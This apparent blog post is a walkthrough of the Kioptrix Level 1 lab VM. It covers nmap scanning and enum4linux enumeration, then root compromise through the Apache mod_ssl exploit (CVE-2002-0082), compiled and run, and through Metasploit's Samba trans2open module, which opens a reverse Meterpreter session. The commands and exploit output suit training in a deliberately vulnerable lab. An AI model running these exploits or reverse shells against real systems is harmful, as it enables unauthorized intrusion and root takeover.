---
layout: post
title:  "Kioptrix: Level 1"
date:   2017-03-10
summary: Kioptrix Level 1 walkthrough
---

### Setup
Download and unzip the vm, then mount the .vmdk file as storage in your vm config and setup your network settings. Note that this vm should auto detect using DHCP.

Virtualbox:  
Because the vm was made in vmware and I'm using virtual box there was an error on boot up "kernel panic". To resolve this the following was changed:

{% highlight python %}
Storage - removed SATA controller, added HD under IDE controller
Network - adapter type changed to PCnet-PCI II
Unticked audio and usb
{% endhighlight %}

# Kioptrix: Level 1
To start we need to find the host on the network, to do this I used nmap to do a ping scan on the subnet:

{% highlight python %}
nmap -sn 192.168.56.0-255

Nmap scan report for 192.168.56.103
Host is up (-0.099s latency).
{% endhighlight %}

## Information gathering
Now we know the IP of the host we can use port scanning to see what services are running. With nmap we can also do some banner grabbing, version checking, OS detection and enumeration of services:

{% highlight python %}
nmap -sS -sV 192.168.56.103

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
{% endhighlight %}

The results show a few interesting services, (22)SSH, (80)HTTP and (139)Samba.

## Enumeration
Focusing on these services we want to enumerate them for further information eg versions, user names and vulnerabilities.

<b>OpenSSH 2.9p2 (protocol 1.99)</b>  
Has a bunch of vulnerabilities associated with it, most of the RCE ones require a specific configuration option set to be exploitable.

<https://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-6040/Openbsd-Openssh-2.9p2.html>

<b>Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</b>  
Has a remote buffer overflow vulnerability CVE-2002-0082 with the mod_ssl/2.8.4. An exploit is available here <https://www.exploit-db.com/exploits/764/>

<b>Samba smbd (workgroup: MYGROUP)</b>  
Kali has enum4linux a tool for enumerating information out of Samba, hopefully it can get us usernames, groups and further information.

{% highlight python %}
enum4linux -a 192.168.56.103

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.56.103
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ====================================================== 
|    Enumerating Workgroup/Domain on 192.168.56.103    |
 ====================================================== 
[+] Got domain/workgroup name: MYGROUP

 ============================================== 
|    Nbtstat Information for 192.168.56.103    |
 ============================================== 
Looking up status of 192.168.56.103
	KIOPTRIX        <00> -         B <ACTIVE>  Workstation Service
	KIOPTRIX        <03> -         B <ACTIVE>  Messenger Service
	KIOPTRIX        <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	MYGROUP         <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	MYGROUP         <1d> -         B <ACTIVE>  Master Browser
	MYGROUP         <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on 192.168.56.103    |
 ======================================= 
[+] Server 192.168.56.103 allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for 192.168.56.103    |
 ============================================= 
Domain Name: MYGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on 192.168.56.103    |
 ======================================== 
[+] Got OS info for 192.168.56.103 from smbclient: Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
[+] Got OS info for 192.168.56.103 from srvinfo:
	KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
	platform_id     :	500
	os version      :	4.5
	server type     :	0x9a03

 =========================================== 
|    Share Enumeration on 192.168.56.103    |
 =========================================== 
WARNING: The "syslog" option is deprecated
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]

	Sharename       Type      Comment
	---------       ----      -------
	IPC$            IPC       IPC Service (Samba Server)
	ADMIN$          IPC       IPC Service (Samba Server)

	Server               Comment
	---------            -------
	KIOPTRIX             Samba Server

	Workgroup            Master
	---------            -------
	MYGROUP              KIOPTRIX
	WORKGROUP            IE11WIN7

[+] Attempting to map shares on 192.168.56.103
//192.168.56.103/IPC$	[E] Can't understand response:
WARNING: The "syslog" option is deprecated
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
//192.168.56.103/ADMIN$	[E] Can't understand response:
WARNING: The "syslog" option is deprecated
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
tree connect failed: NT_STATUS_WRONG_PASSWORD

 ================================ 
|    Groups on 192.168.56.103    |
 ================================ 

[+] Getting builtin groups:
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Power Users] rid:[0x223]
group:[Account Operators] rid:[0x224]
group:[System Operators] rid:[0x225]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]

[+] Getting builtin group memberships:
Group 'Replicator' (RID: 552) has member: Couldn't find group Replicator
Group 'Backup Operators' (RID: 551) has member: Couldn't find group Backup Operators
Group 'Administrators' (RID: 544) has member: Couldn't find group Administrators
Group 'Power Users' (RID: 547) has member: Couldn't find group Power Users
Group 'Account Operators' (RID: 548) has member: Couldn't find group Account Operators
Group 'System Operators' (RID: 549) has member: Couldn't find group System Operators
Group 'Guests' (RID: 546) has member: Couldn't find group Guests
Group 'Print Operators' (RID: 550) has member: Couldn't find group Print Operators
Group 'Users' (RID: 545) has member: Couldn't find group Users

[+] Getting local groups:
group:[sys] rid:[0x3ef]
group:[tty] rid:[0x3f3]
group:[disk] rid:[0x3f5]
group:[mem] rid:[0x3f9]
group:[kmem] rid:[0x3fb]
group:[wheel] rid:[0x3fd]
group:[man] rid:[0x407]
group:[dip] rid:[0x439]
group:[lock] rid:[0x455]
group:[users] rid:[0x4b1]
group:[slocate] rid:[0x413]
group:[floppy] rid:[0x40f]
group:[utmp] rid:[0x415]

[+] Getting local group memberships:

[+] Getting domain groups:
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]

[+] Getting domain group memberships:
Group 'Domain Admins' (RID: 512) has member: Couldn't find group Domain Admins
Group 'Domain Users' (RID: 513) has member: Couldn't find group Domain Users
{% endhighlight %}

This gives us a ton of information about Samba, especially Server=[Samba 2.2.1a]. A quick search reveals a RCE vulnerability.

Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
<https://www.exploit-db.com/exploits/7/>

<https://www.cvedetails.com/vulnerability-list/vendor_id-102/product_id-171/version_id-9501/Samba-Samba-2.2.1a.html>

## Exploitation
We've now found a bunch of vulnerabilities to try out. The 2 most promising are RCE for Apache and SSL (CVE-2002-0082) and Samba (CVE-2003-0201).

#### CVE-2002-0082
Exploit available from <https://www.exploit-db.com/exploits/764/> also note that the exploit code needs updated, the code has a link on how to do this. Also needed to install libssl1.0-dev as well. Once compiled we run it.

{% highlight python %}
gcc -o openfuck openfuck.c -lcrypto
./openfuck

0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
{% endhighlight %}

There are 2 offsets to try 0x6a/0x6b

{% highlight python %}
./openfuck 0x6a 192.168.56.103 443

Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8088
Ready to send shellcode
Spawning shell...
Good Bye!
{% endhighlight %}

0x6a didn't work so we try 0x6b

{% highlight python %}
./openfuck 0x6b 192.168.56.103 443

Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8088
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
.....
23:45:10 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]

[+] Attached to 1074
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root
{% endhighlight %}

#### CVE-2003-0201
Exploit was available in Metasploit:

{% highlight python %}
msf > search cve-2003-0201

Matching Modules
================

   Name                              Disclosure Date  Rank   Description
   ----                              ---------------  ----   -----------
   exploit/freebsd/samba/trans2open  2003-04-07       great  Samba trans2open Overflow (*BSD x86)
   exploit/linux/samba/trans2open    2003-04-07       great  Samba trans2open Overflow (Linux x86)
   exploit/osx/samba/trans2open      2003-04-07       great  Samba trans2open Overflow (Mac OS X PPC)
   exploit/solaris/samba/trans2open  2003-04-07       great  Samba trans2open Overflow (Solaris SPARC)

msf > use exploit/linux/samba/trans2open 
msf exploit(trans2open) > show options

Module options (exploit/linux/samba/trans2open):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce


msf exploit(trans2open) > set rhost 192.168.56.103
rhost => 192.168.56.103
msf exploit(trans2open) > run

[*] Started reverse TCP handler on 192.168.56.101:4444 
[*] 192.168.56.103:139 - Trying return address 0xbffffdfc...
[*] 192.168.56.103:139 - Trying return address 0xbffffcfc...
[*] 192.168.56.103:139 - Trying return address 0xbffffbfc...
[*] 192.168.56.103:139 - Trying return address 0xbffffafc...
[*] Sending stage (798104 bytes) to 192.168.56.103
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.103:32769) at 2017-08-14 22:17:30 +0100
[*] 192.168.56.103 - Meterpreter session 1 closed.  Reason: Died

[-] Invalid session identifier: 1
msf exploit(trans2open) > 
[-] Meterpreter session 1 is not valid and will be closed
whoami
[*] exec: whoami

root
{% endhighlight %}

## Conclusion
A pretty straight forward boot2root vm, both CVE-2002-0082 and CVE-2003-0201 give us RCE as root.